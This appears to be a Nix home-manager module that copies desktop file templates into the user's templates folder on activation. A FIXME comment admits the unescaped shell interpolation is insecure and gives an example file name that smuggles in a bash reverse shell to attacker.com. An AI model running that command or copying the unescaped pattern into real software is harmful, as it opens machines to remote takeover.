{
  lib,
  config,
  hostConfig,
  ...
}: let
  isDesktop = hostConfig.custom.deviceType == "desktop";
in {
  imports = [
    ./gnome.nix
  ];

  options.custom.desktop = {
    templates = lib.mkOption {
      type = lib.types.attrsOf lib.types.path;
      default = {};

      description = ''
        A set of templates available for creating new files.

        These will be exposed via the right-click context menu in the desktop.

        Key is the name of the template, value is the path to its source file.
      '';
    };
  };

  config = lib.mkIf isDesktop {
    custom.desktop.templates = {
      "Empty File" = builtins.toFile "empty.txt" "";
    };

    # TODO: Have a standard way of installing copies from nix store to user's home
    # TODO: Use this for VS code config
    # TODO: Check that the file hasn't been modified before overwriting (maybe preserve mtime during activation, and check for it before overwriting)
    home.activation.install-desktop-templates = let
      # We can't use hardlinks because the nix store is a separate filesystem
      # FIXME: This is super insecure, A reverse shell could be injected using a file named "${bash -i >& /dev/tcp/attacker.com/1234 0>&1}"
      # Should probably do whatever home-manager does for immutable files
      toCopyCommand = name: path: ''
        run cp --force "${path}" "${config.xdg.userDirs.templates}/${name}"
      '';
      files = lib.attrsets.mapAttrsToList toCopyCommand config.custom.desktop.templates;
    in
      lib.hm.dag.entryAfter ["writeBoundary"] ''
        ${lib.concatStringsSep "\n" files}
      '';
  };
}
